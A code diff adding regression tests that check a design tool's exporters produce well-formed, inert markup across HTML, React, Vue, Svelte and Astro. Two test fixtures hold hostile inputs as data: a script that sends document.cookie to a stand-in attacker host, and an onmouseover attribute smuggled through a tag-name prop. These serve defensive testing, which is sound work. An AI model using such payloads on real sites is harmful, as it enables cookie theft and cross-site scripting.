@@ -3,6 +3,7 @@ import {
   PluginRegistry,
   applyOperation,
   createDocument,
+  createNode,
   seededRng,
   setIdRng,
   type DesignDocument,
@@ -205,5 +206,119 @@ describe('html reset', () => {
     expect(styles.contents.indexOf('/* Reset */')).toBeLessThan(
       styles.contents.indexOf('/* Layout */'),
     );
+  });
+});
+
+/**
+ * Regression tests for output that was structurally invalid or executable.
+ *
+ * All three came out of exercising the exporters against documents a real
+ * client can produce: `props` is `z.record(z.unknown())`, so an import, a
+ * plugin or a model can put anything in it, and ordinary marketing copy
+ * contains braces and ampersands.
+ */
+describe('generated markup is well-formed and inert', () => {
+  function withNode(props: Record<string, unknown>, type: string): DesignDocument {
+    setIdRng(seededRng(31));
+    const doc = createDocument({ name: 'Hostile' });
+    const rootId = doc.pages[0]!.rootId;
+    const node = createNode({ type, name: 'Payload', props });
+    return applyOperation(doc, {
+      type: 'insertSubtree',
+      nodes: [node],
+      rootId: node.id,
+      parentId: rootId,
+      index: 0,
+    }).document;
+  }
+
+  async function sourcesFor(doc: DesignDocument, targetId: string): Promise<string> {
+    const { files } = await exportProject(registry, doc, targetId);
+    return files.map((file) => file.contents).join('\n');
+  }
+
+  async function allSources(doc: DesignDocument): Promise<string> {
+    const perTarget = await Promise.all(
+      BUILTIN_EXPORTERS.map((target) => sourcesFor(doc, target.id)),
+    );
+    return perTarget.join('\n');
+  }
+
+  it('will not let a node prop become a tag name', async () => {
+    // `level: 'script'` used to emit a literal <script> element carrying the
+    // node's text, in every target.
+    const evil = withNode(
+      { level: 'script', text: 'fetch("https://attacker.example/" + document.cookie)' },
+      'heading',
+    );
+    const sources = await allSources(evil);
+
+    expect(sources).not.toContain('<script class=');
+    expect(sources).not.toContain('<script className=');
+    expect(sources).toContain('attacker.example');
+    expect(sources).toMatch(/<h2[ >]/);
+  });
+
+  it('will not let a node prop smuggle an attribute through the tag name', async () => {
+    const evil = withNode(
+      { as: 'div onmouseover="alert(document.domain)" data-x', text: 'hover me' },
+      'text',
+    );
+    const sources = await allSources(evil);
+
+    expect(sources).not.toContain('onmouseover');
+    expect(sources).toMatch(/<p[ >]/);
+  });
+
+  it('closes elements that are not void, whatever the primitive declares', async () => {
+    // An unclosed <textarea> is the worst case: it is a raw-text element, so
+    // everything after it on the page becomes its value.
+    const doc = withNode({ placeholder: 'Message', name: 'message' }, 'textarea');
+    const html = await sourcesFor(doc, 'html');
+
+    expect(html).toContain('</textarea>');
+    expect(html).toMatch(/<\/body>\s*<\/html>/);
+  });
+
+  it('keeps <span> and <iframe> closed too', async () => {
+    const icon = await sourcesFor(withNode({ name: 'star' }, 'icon'), 'html');
+    expect(icon).toContain('</span>');
+
+    const embed = await sourcesFor(withNode({ src: 'https://example.com' }, 'embed'), 'html');
+    expect(embed).toContain('</iframe>');
+  });
+
+  it('still writes void elements unclosed in HTML and self-closed elsewhere', async () => {
+    const doc = withNode({ src: 'https://example.com/a.png', alt: 'A' }, 'image');
+
+    expect(await sourcesFor(doc, 'html')).not.toContain('</img>');
+    expect(await sourcesFor(doc, 'react')).toMatch(/<img[^>]*\/>/);
+  });
+
+  it('does not let ordinary copy compile as a template expression', async () => {
+    // Vue reads `{{ x }}` as interpolation; Svelte and Astro read a bare `{x}`
+    // as an expression and fail to compile.
+    const doc = withNode(
+      { text: 'Personalise with {{ user.first_name }} — or use the {name} shorthand' },
+      'text',
+    );
+
+    for (const id of ['vue', 'svelte', 'astro']) {
+      const source = await sourcesFor(doc, id);
+
+      expect(source, id).not.toContain('{{ user.first_name }}');
+      expect(source, id).not.toContain('{name}');
+      expect(source, id).toContain('&#123;');
+    }
+  });
+
+  it('escapes ampersands in JSX text so React renders the source, not an entity', async () => {
+    const doc = withNode({ text: 'Price &lt; 10 &amp; free shipping' }, 'text');
+
+    for (const id of ['react', 'next']) {
+      const source = await sourcesFor(doc, id);
+
+      expect(source, id).toContain('&amp;lt; 10 &amp;amp; free shipping');
+    }
   });
 });
